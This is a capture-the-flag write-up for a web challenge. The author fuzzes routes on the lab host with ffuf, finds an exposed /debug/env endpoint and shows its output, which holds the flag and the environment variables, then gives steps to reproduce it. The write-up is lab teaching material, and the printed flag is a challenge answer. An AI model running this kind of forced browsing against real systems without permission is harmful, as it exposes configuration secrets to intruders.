## On the page "http://leak2.chal.deti:8011" i saw
```

App

Normal API service.
status: /status
```
```
```


## Method
- The first thing i tried was to check the /status which returned 404
- Then i inspected the HTML looking for clues (there were none)
- Then i run a fuzz looking for common routes, got also nothing
```

s04@s04:~$ ffuf -u http://leak2.chal.deti:8011/FUZZ -w /usr/share/dirb/wordlists/common.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://leak2.chal.deti:8011/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 90, Words: 5, Lines: 1, Duration: 5ms]
:: Progress: [4614/4614] :: Job [1/1] :: 1324 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

- So then after reading the challenge description it said something about a debug door, so i tried the fuzz but now looking for /debug/{anything} and it showed a /debug/env
```
s04@s04:~$ ffuf -u http://leak2.chal.deti:8011/debug/FUZZ -w /usr/share/dirb/wordlists/common.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://leak2.chal.deti:8011/debug/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

env                     [Status: 200, Size: 417, Words: 1, Lines: 2, Duration: 18ms]
:: Progress: [4614/4614] :: Job [1/1] :: 1503 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

```
```
```

- Then i went to /debug/env and it returned
```
	
FLAG	"flag{5887c981316efe2c3d61fae96f7b0b01}"
GPG_KEY	"7169605F62C751356D054A26A821E680E5FA6305"
HOME	"/home/ctf"
HOSTNAME	"4343ca271cd3"
LANG	"C.UTF-8"
PATH	"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
PYTHON_SHA256	"5c8462af5790baf43a321a1559dbe0db06d1be4300fb85fb53c40060668e548a"
PYTHON_VERSION	"3.12.14"
SERVER_SOFTWARE	"gunicorn/26.2.0"
container	"podman"
```
```
```
```
```

- The flag is there

## Reproduce
- Run "ffuf -u http://leak2.chal.deti:8011/debug/FUZZ -w /usr/share/dirb/wordlists/common.txt -ac"
- Check that it gave a env result
- Go to "http://leak2.chal.deti:8011/debug/env" 
- The flag is there
```
```
